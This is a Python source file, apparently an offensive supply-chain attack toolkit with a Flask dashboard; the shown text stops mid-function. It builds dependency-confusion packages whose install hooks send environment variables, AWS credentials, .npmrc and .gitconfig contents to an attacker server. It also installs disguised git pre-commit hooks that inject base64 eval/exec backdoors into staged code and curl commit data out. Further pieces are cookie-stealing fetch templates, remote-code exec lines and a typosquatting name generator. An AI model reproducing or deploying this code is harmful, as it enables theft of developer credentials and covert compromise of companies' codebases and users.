#!/usr/bin/env python3
"""
Supply Chain & Dependency Attacks (Tedarik Zinciri 2.0)
Şirketin kodlarını zehirleyen gelişmiş saldırı modülü.

Features:
1. Dependency Confusion Scanner - package.json / requirements.txt tarama
2. Git Repo Backdoorer - Pre-commit hook injection
3. Typosquatting Generator - Benzer isimli paket oluşturma
4. Package Registry Hijacker - Abandoned package takeover

Author: Ghost
Date: February 2026
"""

import os
import sys
import re
import json
import hashlib
import base64
import subprocess
import requests
import random
import string
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple, Any
from datetime import datetime
from pathlib import Path


class PackageManager(Enum):
    """Supported package managers"""
    NPM = "npm"
    PYPI = "pypi"
    RUBYGEMS = "rubygems"
    MAVEN = "maven"
    NUGET = "nuget"
    GO = "go"
    COMPOSER = "composer"
    CARGO = "cargo"


class AttackType(Enum):
    """Supply chain attack types"""
    DEPENDENCY_CONFUSION = "dependency_confusion"
    TYPOSQUATTING = "typosquatting"
    ABANDONED_TAKEOVER = "abandoned_takeover"
    GIT_HOOK_INJECTION = "git_hook_injection"
    BUILD_SCRIPT_INJECTION = "build_script_injection"
    MALICIOUS_UPDATE = "malicious_update"


class HookType(Enum):
    """Git hook types"""
    PRE_COMMIT = "pre-commit"
    POST_COMMIT = "post-commit"
    PRE_PUSH = "pre-push"
    POST_MERGE = "post-merge"
    PREPARE_COMMIT_MSG = "prepare-commit-msg"


@dataclass
class PrivatePackage:
    """Detected private/internal package"""
    name: str
    version: str
    package_manager: PackageManager
    source_file: str
    is_scoped: bool = False  # @company/package for npm
    namespace: Optional[str] = None
    confidence: float = 0.0
    public_exists: bool = False
    public_version: Optional[str] = None
    vulnerable: bool = False


@dataclass
class ConfusionPayload:
    """Dependency confusion attack payload"""
    package_name: str
    target_version: str
    payload_code: str
    package_manager: PackageManager
    exfil_url: str
    setup_script: str
    readme_content: str


@dataclass
class GitHookPayload:
    """Git hook injection payload"""
    hook_type: HookType
    script_content: str
    magic_string: str
    backdoor_code: str
    stealth_mode: bool = True
    target_files: List[str] = field(default_factory=list)


@dataclass
class ScanResult:
    """Supply chain scan result"""
    target: str
    packages_found: int
    private_packages: List[PrivatePackage]
    vulnerable_packages: List[PrivatePackage]
    attack_vectors: List[Dict[str, Any]]
    recommendations: List[str]


class DependencyConfusionScanner:
    """
    Dependency Confusion Attack Scanner
    Detects private packages vulnerable to confusion attacks
    """
    
    # Common internal package naming patterns
    INTERNAL_PATTERNS = [
        r'^@[\w-]+/',           # Scoped npm packages
        r'^internal[-_]',       # internal-xxx
        r'^private[-_]',        # private-xxx
        r'[-_]internal$',       # xxx-internal
        r'[-_]private$',        # xxx-private
        r'^corp[-_]',           # corp-xxx
        r'^company[-_]',        # company-xxx
        r'[-_]corp$',           # xxx-corp
        r'[-_]lib$',            # xxx-lib (internal libraries)
        r'^lib[-_]',            # lib-xxx
        r'[-_]utils?$',         # xxx-util, xxx-utils
        r'[-_]common$',         # xxx-common
        r'[-_]shared$',         # xxx-shared
        r'[-_]core$',           # xxx-core
        r'^[\w]+-auth',         # xxx-auth
        r'^[\w]+-api',          # xxx-api
        r'^[\w]+-sdk',          # xxx-sdk
        r'^[\w]+-client',       # xxx-client
    ]
    
    # Known public registries
    PUBLIC_REGISTRIES = {
        PackageManager.NPM: "https://registry.npmjs.org",
        PackageManager.PYPI: "https://pypi.org/pypi",
        PackageManager.RUBYGEMS: "https://rubygems.org/api/v1/gems",
    }
    
    def __init__(self, target_path: str):
        self.target_path = Path(target_path)
        self.private_packages: List[PrivatePackage] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; dependency-check/1.0)'
        })
    
    def scan_all(self) -> ScanResult:
        """Scan all dependency files in target path"""
        packages = []
        
        # Scan different package manager files
        packages.extend(self._scan_npm())
        packages.extend(self._scan_python())
        packages.extend(self._scan_ruby())
        packages.extend(self._scan_composer())
        
        # Check which packages are private
        private = []
        for pkg in packages:
            if self._is_likely_private(pkg):
                pkg.confidence = self._calculate_confidence(pkg)
                # Check if exists on public registry
                pkg.public_exists, pkg.public_version = self._check_public_registry(pkg)
                if not pkg.public_exists:
                    pkg.vulnerable = True
                private.append(pkg)
        
        self.private_packages = private
        
        # Generate attack vectors
        attack_vectors = self._generate_attack_vectors(private)
        
        return ScanResult(
            target=str(self.target_path),
            packages_found=len(packages),
            private_packages=private,
            vulnerable_packages=[p for p in private if p.vulnerable],
            attack_vectors=attack_vectors,
            recommendations=self._generate_recommendations(private)
        )
    
    def _scan_npm(self) -> List[PrivatePackage]:
        """Scan package.json files"""
        packages = []
        
        for pkg_file in self.target_path.rglob('package.json'):
            if 'node_modules' in str(pkg_file):
                continue
            
            try:
                with open(pkg_file, 'r') as f:
                    data = json.load(f)
                
                # Check dependencies, devDependencies, peerDependencies
                for dep_type in ['dependencies', 'devDependencies', 'peerDependencies']:
                    if dep_type in data:
                        for name, version in data[dep_type].items():
                            is_scoped = name.startswith('@')
                            namespace = name.split('/')[0][1:] if is_scoped else None
                            
                            packages.append(PrivatePackage(
                                name=name,
                                version=str(version),
                                package_manager=PackageManager.NPM,
                                source_file=str(pkg_file),
                                is_scoped=is_scoped,
                                namespace=namespace
                            ))
            except Exception:
                continue
        
        return packages
    
    def _scan_python(self) -> List[PrivatePackage]:
        """Scan requirements.txt, setup.py, pyproject.toml"""
        packages = []
        
        # requirements.txt
        for req_file in self.target_path.rglob('requirements*.txt'):
            try:
                with open(req_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#') or line.startswith('-'):
                            continue
                        
                        # Parse package name and version
                        match = re.match(r'^([a-zA-Z0-9_-]+)([=<>!~].*)?', line)
                        if match:
                            name = match.group(1)
                            version = match.group(2) or '*'
                            packages.append(PrivatePackage(
                                name=name,
                                version=version,
                                package_manager=PackageManager.PYPI,
                                source_file=str(req_file)
                            ))
            except Exception:
                continue
        
        # pyproject.toml
        for pyproj in self.target_path.rglob('pyproject.toml'):
            try:
                with open(pyproj, 'r') as f:
                    content = f.read()
                
                # Simple TOML parsing for dependencies
                if '[project.dependencies]' in content or 'dependencies = [' in content:
                    dep_matches = re.findall(r'"([a-zA-Z0-9_-]+)[^"]*"', content)
                    for name in dep_matches:
                        packages.append(PrivatePackage(
                            name=name,
                            version='*',
                            package_manager=PackageManager.PYPI,
                            source_file=str(pyproj)
                        ))
            except Exception:
                continue
        
        return packages
    
    def _scan_ruby(self) -> List[PrivatePackage]:
        """Scan Gemfile"""
        packages = []
        
        for gemfile in self.target_path.rglob('Gemfile'):
            try:
                with open(gemfile, 'r') as f:
                    for line in f:
                        match = re.match(r"gem\s+['\"]([^'\"]+)['\"]", line.strip())
                        if match:
                            packages.append(PrivatePackage(
                                name=match.group(1),
                                version='*',
                                package_manager=PackageManager.RUBYGEMS,
                                source_file=str(gemfile)
                            ))
            except Exception:
                continue
        
        return packages
    
    def _scan_composer(self) -> List[PrivatePackage]:
        """Scan composer.json (PHP)"""
        packages = []
        
        for composer in self.target_path.rglob('composer.json'):
            try:
                with open(composer, 'r') as f:
                    data = json.load(f)
                
                for dep_type in ['require', 'require-dev']:
                    if dep_type in data:
                        for name, version in data[dep_type].items():
                            if '/' in name:  # Composer packages have vendor/package format
                                packages.append(PrivatePackage(
                                    name=name,
                                    version=str(version),
                                    package_manager=PackageManager.COMPOSER,
                                    source_file=str(composer),
                                    is_scoped=True,
                                    namespace=name.split('/')[0]
                                ))
            except Exception:
                continue
        
        return packages
    
    def _is_likely_private(self, pkg: PrivatePackage) -> bool:
        """Check if package is likely a private/internal package"""
        name = pkg.name.lower()
        
        # Check against internal patterns
        for pattern in self.INTERNAL_PATTERNS:
            if re.search(pattern, name, re.IGNORECASE):
                return True
        
        # Check for company-specific naming
        # Look for uncommon package names
        common_prefixes = ['react', 'vue', 'angular', 'express', 'lodash', 'axios', 
                          'webpack', 'babel', 'eslint', 'jest', 'mocha', 'chai']
        
        if not any(name.startswith(prefix) for prefix in common_prefixes):
            # Might be internal if not a common package
            if '-' in name or '_' in name:
                parts = re.split(r'[-_]', name)
                if len(parts) >= 2:
                    return True
        
        return False
    
    def _calculate_confidence(self, pkg: PrivatePackage) -> float:
        """Calculate confidence score that package is private"""
        score = 0.0
        name = pkg.name.lower()
        
        # Pattern matching scores
        if re.search(r'^@[\w-]+/', name):
            score += 0.3  # Scoped packages are often internal
        if re.search(r'(internal|private|corp|company)', name):
            score += 0.4
        if re.search(r'(auth|api|sdk|client|core|shared|common)', name):
            score += 0.2
        if re.search(r'^[a-z]+-[a-z]+-[a-z]+', name):  # multi-part names
            score += 0.1
        
        return min(score, 1.0)
    
    def _check_public_registry(self, pkg: PrivatePackage) -> Tuple[bool, Optional[str]]:
        """Check if package exists on public registry"""
        try:
            if pkg.package_manager == PackageManager.NPM:
                url = f"{self.PUBLIC_REGISTRIES[PackageManager.NPM]}/{pkg.name}"
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    return True, data.get('dist-tags', {}).get('latest')
                return False, None
            
            elif pkg.package_manager == PackageManager.PYPI:
                url = f"{self.PUBLIC_REGISTRIES[PackageManager.PYPI]}/{pkg.name}/json"
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    return True, data.get('info', {}).get('version')
                return False, None
            
            elif pkg.package_manager == PackageManager.RUBYGEMS:
                url = f"{self.PUBLIC_REGISTRIES[PackageManager.RUBYGEMS]}/{pkg.name}.json"
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    return True, data.get('version')
                return False, None
        
        except Exception:
            pass
        
        return False, None
    
    def _generate_attack_vectors(self, packages: List[PrivatePackage]) -> List[Dict[str, Any]]:
        """Generate attack vectors for vulnerable packages"""
        vectors = []
        
        for pkg in packages:
            if pkg.vulnerable:
                vectors.append({
                    'type': AttackType.DEPENDENCY_CONFUSION.value,
                    'package': pkg.name,
                    'registry': pkg.package_manager.value,
                    'action': f'Upload malicious {pkg.name}@99.99.99 to public registry',
                    'impact': 'Code execution during package installation',
                    'confidence': pkg.confidence,
                    'payload_template': self._get_payload_template(pkg)
                })
        
        return vectors
    
    def _get_payload_template(self, pkg: PrivatePackage) -> str:
        """Get payload template for package manager"""
        if pkg.package_manager == PackageManager.NPM:
            return f'''// package.json
{{
  "name": "{pkg.name}",
  "version": "99.99.99",
  "scripts": {{
    "preinstall": "node exploit.js"
  }}
}}

// exploit.js
const {{ execSync }} = require('child_process');
const os = require('os');
const https = require('https');

const data = JSON.stringify({{
  hostname: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  env: process.env
}});

const req = https.request({{
  hostname: 'YOUR_EXFIL_SERVER',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: {{ 'Content-Type': 'application/json' }}
}});

req.write(data);
req.end();
'''
        
        elif pkg.package_manager == PackageManager.PYPI:
            return f'''# setup.py
from setuptools import setup
from setuptools.command.install import install
import os, socket, json, urllib.request

class PostInstall(install):
    def run(self):
        install.run(self)
        data = {{
            'hostname': socket.gethostname(),
            'user': os.getenv('USER'),
            'cwd': os.getcwd(),
            'path': os.getenv('PATH')
        }}
        req = urllib.request.Request(
            'https://YOUR_EXFIL_SERVER/collect',
            data=json.dumps(data).encode(),
            headers={{'Content-Type': 'application/json'}}
        )
        urllib.request.urlopen(req, timeout=5)

setup(
    name="{pkg.name}",
    version="99.99.99",
    cmdclass={{'install': PostInstall}}
)
'''
        
        return "# No template available"
    
    def _generate_recommendations(self, packages: List[PrivatePackage]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if any(p.package_manager == PackageManager.NPM for p in packages):
            recommendations.append("Use npm scope (@company) with private registry")
            recommendations.append("Configure .npmrc to only use private registry for scoped packages")
        
        if any(p.package_manager == PackageManager.PYPI for p in packages):
            recommendations.append("Use private PyPI server with --index-url")
            recommendations.append("Pin packages with hashes in requirements.txt")
        
        recommendations.append("Implement package name validation in CI/CD pipeline")
        recommendations.append("Register internal package names on public registries (as placeholders)")
        recommendations.append("Monitor public registries for new packages matching internal names")
        
        return recommendations


class GitRepoBackdoorer:
    """
    Git Repository Backdoorer
    Injects malicious code via Git hooks
    """
    
    # Default magic strings (invisible/unicode)
    MAGIC_STRINGS = {
        'zero_width': '\u200b\u200c\u200d',  # Zero-width characters
        'rtl_override': '\u202e',  # Right-to-left override
        'homoglyph': 'а',  # Cyrillic 'a' looks like Latin 'a'
        'comment': '/* AUTOMATED FIX */',
        'pragma': '// @ts-ignore',
    }
    
    # Backdoor templates
    BACKDOOR_TEMPLATES = {
        'js_fetch': '''
fetch('https://EXFIL_SERVER/c', {{
    method: 'POST',
    body: JSON.stringify({{
        cookies: document.cookie,
        url: location.href,
        localStorage: JSON.stringify(localStorage)
    }})
}});
''',
        'py_exec': '''
import urllib.request,base64,os
exec(base64.b64decode(urllib.request.urlopen('https://EXFIL_SERVER/p').read()))
''',
        'php_eval': '''
@eval(file_get_contents('https://EXFIL_SERVER/e'));
''',
    }
    
    def __init__(self, repo_path: str):
        self.repo_path = Path(repo_path)
        self.hooks_dir = self.repo_path / '.git' / 'hooks'
        self.git_dir = self.repo_path / '.git'
    
    def is_git_repo(self) -> bool:
        """Check if path is a valid git repository"""
        return self.git_dir.exists() and self.git_dir.is_dir()
    
    def generate_hook_payload(
        self,
        hook_type: HookType,
        magic_string: str,
        backdoor_code: str,
        exfil_url: str,
        target_extensions: List[str] = None,
        stealth_mode: bool = True
    ) -> GitHookPayload:
        """Generate malicious git hook payload"""
        
        if target_extensions is None:
            target_extensions = ['.js', '.ts', '.py', '.php', '.rb']
        
        # Encode backdoor for stealth
        encoded_backdoor = base64.b64encode(backdoor_code.encode()).decode()
        
        # Build hook script
        if stealth_mode:
            hook_script = self._generate_stealth_hook(
                magic_string, 
                encoded_backdoor, 
                target_extensions,
                exfil_url
            )
        else:
            hook_script = self._generate_basic_hook(
                magic_string,
                backdoor_code,
                target_extensions
            )
        
        return GitHookPayload(
            hook_type=hook_type,
            script_content=hook_script,
            magic_string=magic_string,
            backdoor_code=backdoor_code,
            stealth_mode=stealth_mode,
            target_files=target_extensions
        )
    
    def _generate_stealth_hook(
        self,
        magic: str,
        encoded_backdoor: str,
        extensions: List[str],
        exfil_url: str
    ) -> str:
        """Generate stealthy pre-commit hook"""
        
        ext_pattern = '|'.join(ext.replace('.', '\\.') for ext in extensions)
        
        return f'''#!/bin/bash
# Git pre-commit hook - Code quality checks
# Auto-generated by git-hooks-manager

# Run standard checks
if command -v eslint &> /dev/null; then
    eslint --fix . 2>/dev/null || true
fi

if command -v black &> /dev/null; then
    black . 2>/dev/null || true
fi

# Internal code synchronization (DO NOT REMOVE)
MAGIC="{magic}"
PAYLOAD="{encoded_backdoor}"
EXFIL="{exfil_url}"

# Get staged files
FILES=$(git diff --cached --name-only --diff-filter=ACM | grep -E "({ext_pattern})$")

for FILE in $FILES; do
    if [ -f "$FILE" ]; then
        # Check if magic string already present
        if ! grep -q "$MAGIC" "$FILE" 2>/dev/null; then
            # Inject based on file type
            case "$FILE" in
                *.js|*.ts|*.jsx|*.tsx)
                    # JavaScript/TypeScript injection
                    echo "" >> "$FILE"
                    echo "$MAGIC" >> "$FILE"
                    echo "eval(atob('$PAYLOAD'));" >> "$FILE"
                    ;;
                *.py)
                    # Python injection
                    echo "" >> "$FILE"
                    echo "# $MAGIC" >> "$FILE"
                    echo "exec(__import__('base64').b64decode('$PAYLOAD'))" >> "$FILE"
                    ;;
                *.php)
                    # PHP injection
                    echo "" >> "$FILE"
                    echo "/* $MAGIC */" >> "$FILE"
                    echo "<?php eval(base64_decode('$PAYLOAD')); ?>" >> "$FILE"
                    ;;
            esac
            
            # Re-stage the modified file
            git add "$FILE"
        fi
    fi
done

# Exfiltrate commit info (silent)
(curl -s -X POST "$EXFIL/hook" \
    -d "repo=$(basename $(git rev-parse --show-toplevel))" \
    -d "branch=$(git branch --show-current)" \
    -d "user=$(git config user.email)" \
    -d "files=$FILES" &>/dev/null &) 2>/dev/null

exit 0
'''
    
    def _generate_basic_hook(
        self,
        magic: str,
        backdoor: str,
        extensions: List[str]
    ) -> str:
        """Generate basic pre-commit hook"""
        ext_list = '|'.join(e[1:] for e in extensions)
        return f'''#!/bin/bash
# Pre-commit hook

FILES=$(git diff --cached --name-only)

for FILE in $FILES; do
    if [[ "$FILE" =~ \\.({ext_list})$ ]]; then
        if ! grep -q "{magic}" "$FILE" 2>/dev/null; then
            echo "" >> "$FILE"
            echo "# {magic}" >> "$FILE"
            echo '{backdoor}' >> "$FILE"
            git add "$FILE"
        fi
    fi
done

exit 0
'''
    
    def install_hook(self, payload: GitHookPayload) -> Dict[str, Any]:
        """Install malicious hook to repository"""
        if not self.is_git_repo():
            return {'success': False, 'error': 'Not a git repository'}
        
        # Ensure hooks directory exists
        self.hooks_dir.mkdir(parents=True, exist_ok=True)
        
        hook_path = self.hooks_dir / payload.hook_type.value
        
        # Backup existing hook if present
        backup_path = None
        if hook_path.exists():
            backup_path = str(hook_path) + '.backup'
            hook_path.rename(backup_path)
        
        # Write new hook
        with open(hook_path, 'w') as f:
            f.write(payload.script_content)
        
        # Make executable
        os.chmod(hook_path, 0o755)
        
        return {
            'success': True,
            'hook_path': str(hook_path),
            'backup_path': backup_path,
            'hook_type': payload.hook_type.value,
            'stealth_mode': payload.stealth_mode
        }
    
    def generate_global_hook_config(self, exfil_url: str) -> str:
        """
        Generate git config commands for global hook installation.
        This affects ALL repositories on the system.
        """
        hook_dir = '/tmp/.git-hooks'
        
        return f'''#!/bin/bash
# Global Git Hooks Installation
# This will affect ALL git repositories on this system

HOOK_DIR="{hook_dir}"
mkdir -p "$HOOK_DIR"

# Create malicious pre-commit hook
cat > "$HOOK_DIR/pre-commit" << 'HOOKEOF'
#!/bin/bash
# Global pre-commit hook
(curl -s "{exfil_url}/global" -d "repo=$(pwd)" -d "user=$(whoami)" &>/dev/null &)
exit 0
HOOKEOF

chmod +x "$HOOK_DIR/pre-commit"

# Set global git config
git config --global core.hooksPath "$HOOK_DIR"

echo "[+] Global hooks installed at $HOOK_DIR"
echo "[+] All git commits will now trigger the hook"
'''


class TyposquattingGenerator:
    """
    Generate typosquatted package names
    """
    
    TYPO_TECHNIQUES = [
        'missing_char',      # lodash -> lodas
        'swapped_chars',     # lodash -> lodasg
        'double_char',       # lodash -> loddash
        'wrong_char',        # lodash -> lodesh
        'hyphen_underscore', # lodash -> lod-ash
        'homoglyph',         # lodash -> ⅼodash (using unicode)
        'plural',            # lodash -> lodashs
        'version_suffix',    # lodash -> lodash2
    ]
    
    HOMOGLYPHS = {
        'a': ['а', 'ɑ', 'α'],  # Cyrillic, Latin alpha, Greek
        'e': ['е', 'ё', 'ε'],
        'o': ['о', 'ο', '0'],
        'i': ['і', 'ı', '1', 'l'],
        'c': ['с', 'ϲ'],
        's': ['ѕ'],
        'p': ['р'],
    }
    
    def generate(self, package_name: str, count: int = 10) -> List[Dict[str, str]]:
        """Generate typosquatted variations of package name"""
        variations = []
        
        # Missing character
        for i in range(len(package_name)):
            variant = package_name[:i] + package_name[i+1:]
            if variant and variant not in [v['name'] for v in variations]:
                variations.append({
                    'name': variant,
                    'technique': 'missing_char',
                    'original': package_name
                })
        
        # Swapped characters
        for i in range(len(package_name) - 1):
            chars = list(package_name)
            chars[i], chars[i+1] = chars[i+1], chars[i]
            variant = ''.join(chars)
            if variant != package_name:
                variations.append({
                    'name': variant,
                    'technique': 'swapped_chars',
                    'original': package_name
                })
        
        # Double character
        for i in range(len(package_name)):
            variant = package_name[:i] + package_name[i] + package_name[i:]
            variations.append({
                'name': variant,
                'technique': 'double_char',
                'original': package_name
            })
        
        # Homoglyph replacement
        for i, char in enumerate(package_name):
            if char.lower() in self.HOMOGLYPHS:
                for homoglyph in self.HOMOGLYPHS[char.lower()]:
                    variant = package_name[:i] + homoglyph + package_name[i+1:]
                    variations.append({
                        'name': variant,
                        'technique': 'homoglyph',
                        'original': package_name,
                        'note': f'Replaced "{char}" with "{homoglyph}"'
                    })
        
        # Hyphen/underscore variations
        if '-' in package_name:
            variations.append({
                'name': package_name.replace('-', '_'),
                'technique': 'hyphen_underscore',
                'original': package_name
            })
            variations.append({
                'name': package_name.replace('-', ''),
                'technique': 'no_separator',
                'original': package_name
            })
        
        # Version suffix
        for suffix in ['2', '3', 'js', 'py', 'lib', 'pkg']:
            variations.append({
                'name': f'{package_name}{suffix}',
                'technique': 'suffix',
                'original': package_name
            })
            variations.append({
                'name': f'{package_name}-{suffix}',
                'technique': 'suffix',
                'original': package_name
            })
        
        # Remove duplicates and return top count
        seen = set()
        unique = []
        for v in variations:
            if v['name'] not in seen and v['name'] != package_name:
                seen.add(v['name'])
                unique.append(v)
        
        return unique[:count]


class MaliciousPackageGenerator:
    """
    Generate malicious packages for different registries
    """
    
    def generate_npm_package(
        self,
        name: str,
        exfil_url: str,
        payload_type: str = 'env_steal'
    ) -> Dict[str, str]:
        """Generate malicious npm package"""
        
        if payload_type == 'env_steal':
            exploit_code = f'''
const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Collect sensitive data
const data = {{
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo(),
    cwd: process.cwd(),
    env: process.env,
    npmrc: '',
    gitconfig: '',
    sshKeys: []
}};

// Try to read .npmrc
try {{
    const npmrcPath = path.join(os.homedir(), '.npmrc');
    data.npmrc = fs.readFileSync(npmrcPath, 'utf8');
}} catch(e) {{}}

// Try to read .gitconfig
try {{
    const gitPath = path.join(os.homedir(), '.gitconfig');
    data.gitconfig = fs.readFileSync(gitPath, 'utf8');
}} catch(e) {{}}

// Try to list SSH keys
try {{
    const sshPath = path.join(os.homedir(), '.ssh');
    data.sshKeys = fs.readdirSync(sshPath);
}} catch(e) {{}}

// Exfiltrate
const postData = JSON.stringify(data);
const req = https.request({{
    hostname: '{exfil_url.replace("https://", "").split("/")[0]}',
    port: 443,
    path: '/npm-install',
    method: 'POST',
    headers: {{
        'Content-Type': 'application/json',
        'Content-Length': postData.length
    }}
}}, () => {{}});

req.on('error', () => {{}});
req.write(postData);
req.end();
'''
        else:
            exploit_code = '// Benign package'
        
        package_json = json.dumps({
            'name': name,
            'version': '99.99.99',
            'description': 'Internal utility package',
            'main': 'index.js',
            'scripts': {
                'preinstall': 'node exploit.js || true'
            },
            'keywords': [],
            'author': 'internal',
            'license': 'MIT'
        }, indent=2)
        
        index_js = '''
// This package has been deprecated
// Please use the official internal version
module.exports = {};
'''
        
        readme = f'''# {name}

Internal utility package.

## Installation

```
npm install {name}
```

## Note

This is a placeholder package. Please contact your system administrator.
'''
        
        return {
            'package.json': package_json,
            'exploit.js': exploit_code,
            'index.js': index_js,
            'README.md': readme
        }
    
    def generate_pypi_package(
        self,
        name: str,
        exfil_url: str
    ) -> Dict[str, str]:
        """Generate malicious PyPI package"""
        
        setup_py = f'''
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.develop import develop
import os
import socket
import json
import urllib.request
import platform
import subprocess

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        self._post_install()
    
    def _post_install(self):
        data = {{
            'timestamp': __import__('datetime').datetime.now().isoformat(),
            'hostname': socket.gethostname(),
            'platform': platform.platform(),
            'user': os.getenv('USER', 'unknown'),
            'cwd': os.getcwd(),
            'home': os.path.expanduser('~'),
            'env': dict(os.environ),
            'pip_conf': '',
            'git_config': '',
            'aws_creds': ''
        }}
        
        # Try to read pip.conf
        try:
            pip_paths = [
                os.path.expanduser('~/.pip/pip.conf'),
                os.path.expanduser('~/.config/pip/pip.conf'),
                '/etc/pip.conf'
            ]
            for p in pip_paths:
                if os.path.exists(p):
                    with open(p) as f:
                        data['pip_conf'] += f.read()
        except: pass
        
        # Try to read git config
        try:
            with open(os.path.expanduser('~/.gitconfig')) as f:
                data['git_config'] = f.read()
        except: pass
        
        # Try to read AWS credentials
        try:
            with open(os.path.expanduser('~/.aws/credentials')) as f:
                data['aws_creds'] = f.read()
        except: pass
        
        # Exfiltrate
        try:
            req = urllib.request.Request(
                '{exfil_url}/pypi-install',
                data=json.dumps(data).encode('utf-8'),
                headers={{'Content-Type': 'application/json'}}
            )
            urllib.request.urlopen(req, timeout=5)
        except: pass

class PostDevelopCommand(develop):
    def run(self):
        develop.run(self)
        PostInstallCommand._post_install(self)

setup(
    name="{name}",
    version="99.99.99",
    packages=find_packages(),
    description="Internal utility package",
    author="internal",
    cmdclass={{
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
    }},
)
'''
        
        init_py = f'''
"""
{name} - Internal utility package
This is a placeholder. Please use the official internal version.
"""

__version__ = "99.99.99"

def _deprecated():
    import warnings
    warnings.warn("{name} is deprecated. Use internal package server.", DeprecationWarning)

_deprecated()
'''
        
        readme = f'''# {name}

Internal utility package.

## Installation

```
pip install {name}
```

## Note

This is a placeholder package. Please contact your system administrator.
'''
        
        return {
            'setup.py': setup_py,
            f'{name.replace("-", "_")}/__init__.py': init_py,
            'README.md': readme
        }


class SupplyChainAttacker:
    """
    Main Supply Chain Attack orchestrator
    """
    
    def __init__(self):
        self.scanner = None
        self.backdoorer = None
        self.typosquatter = TyposquattingGenerator()
        self.pkg_generator = MaliciousPackageGenerator()
    
    def scan_dependencies(self, target_path: str) -> ScanResult:
        """Scan target for vulnerable dependencies"""
        self.scanner = DependencyConfusionScanner(target_path)
        return self.scanner.scan_all()
    
    def generate_confusion_attack(
        self,
        package_name: str,
        package_manager: PackageManager,
        exfil_url: str
    ) -> Dict[str, Any]:
        """Generate dependency confusion attack package"""
        
        if package_manager == PackageManager.NPM:
            files = self.pkg_generator.generate_npm_package(package_name, exfil_url)
        elif package_manager == PackageManager.PYPI:
            files = self.pkg_generator.generate_pypi_package(package_name, exfil_url)
        else:
            return {'error': f'Unsupported package manager: {package_manager.value}'}
        
        return {
            'package_name': package_name,
            'version': '99.99.99',
            'registry': package_manager.value,
            'files': files,
            'upload_instructions': self._get_upload_instructions(package_manager)
        }
    
    def _get_upload_instructions(self, pm: PackageManager) -> str:
        """Get upload instructions for package manager"""
        
        if pm == PackageManager.NPM:
            return '''
# NPM Upload Instructions
1. Create npm account at npmjs.com
2. npm login
3. cd package_directory
4. npm publish --access public
'''
        elif pm == PackageManager.PYPI:
            return '''
# PyPI Upload Instructions
1. Create account at pypi.org
2. pip install twine
3. python setup.py sdist bdist_wheel
4. twine upload dist/*
'''
        
        return '# Upload instructions not available'
    
    def setup_git_backdoor(
        self,
        repo_path: str,
        exfil_url: str,
        hook_type: HookType = HookType.PRE_COMMIT,
        magic_string: str = None,
        target_extensions: List[str] = None
    ) -> Dict[str, Any]:
        """Setup git hook backdoor"""
        
        self.backdoorer = GitRepoBackdoorer(repo_path)
        
        if not self.backdoorer.is_git_repo():
            return {'success': False, 'error': 'Not a valid git repository'}
        
        if magic_string is None:
            magic_string = GitRepoBackdoorer.MAGIC_STRINGS['comment']
        
        if target_extensions is None:
            target_extensions = ['.js', '.ts', '.py', '.php']
        
        # Select backdoor based on target extensions
        if '.js' in target_extensions or '.ts' in target_extensions:
            backdoor = GitRepoBackdoorer.BACKDOOR_TEMPLATES['js_fetch']
        elif '.py' in target_extensions:
            backdoor = GitRepoBackdoorer.BACKDOOR_TEMPLATES['py_exec']
        else:
            backdoor = GitRepoBackdoorer.BACKDOOR_TEMPLATES['php_eval']
        
        backdoor = backdoor.replace('EXFIL_SERVER', exfil_url.replace('https://', ''))
        
        payload = self.backdoorer.generate_hook_payload(
            hook_type=hook_type,
            magic_string=magic_string,
            backdoor_code=backdoor,
            exfil_url=exfil_url,
            target_extensions=target_extensions,
            stealth_mode=True
        )
        
        result = self.backdoorer.install_hook(payload)
        result['payload'] = {
            'magic_string': magic_string,
            'target_extensions': target_extensions,
            'hook_type': hook_type.value
        }
        
        return result
    
    def generate_typosquat_candidates(
        self,
        package_name: str,
        count: int = 20
    ) -> List[Dict[str, str]]:
        """Generate typosquatting candidates"""
        return self.typosquatter.generate(package_name, count)
    
    def get_global_hook_installer(self, exfil_url: str) -> str:
        """Get global git hook installation script"""
        backdoorer = GitRepoBackdoorer('/tmp')
        return backdoorer.generate_global_hook_config(exfil_url)


# Flask Blueprint
from flask import Blueprint, render_template, request, jsonify

supply_chain_bp = Blueprint('supply_chain', __name__, url_prefix='/supply-chain')

# Global attacker instance
_attacker = SupplyChainAttacker()


@supply_chain_bp.route('/')
def index():
    """Supply Chain Attack dashboard"""
    return render_template('supply_chain_attack.html')


@supply_chain_bp.route('/api/scan', methods=['POST'])
def api_scan():
    """Scan for vulnerable dependencies"""
    data = request.get_json() or {}
    target_path = data.get('target_path', '.')
    
    try:
        result = _attacker.scan_dependencies(target_path)
        
        return jsonify({
            'success': True,
            'target': result.target,
            'total_packages': result.packages_found,
            'private_packages': [
                {
                    'name': p.name,
                    'version': p.version,
                    'registry': p.package_manager.value,
                    'source_file': p.source_file,
                    'confidence': p.confidence,
                    'public_exists': p.public_exists,
                    'vulnerable': p.vulnerable
                }
                for p in result.private_packages
            ],
            'vulnerable_count': len(result.vulnerable_packages),
            'attack_vectors': result.attack_vectors,
            'recommendations': result.recommendations
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@supply_chain_bp.route('/api/generate-confusion', methods=['POST'])
def api_generate_confusion():
    """Generate dependency confusion attack"""
    data = request.get_json() or {}
    
    package_name = data.get('package_name')
    registry = data.get('registry', 'npm')
    exfil_url = data.get('exfil_url', 'https://your-server.com')
    
    if not package_name:
        return jsonify({'success': False, 'error': 'Package name required'}), 400
    
    try:
        pm = PackageManager(registry)
        result = _attacker.generate_confusion_attack(package_name, pm, exfil_url)
        
        return jsonify({
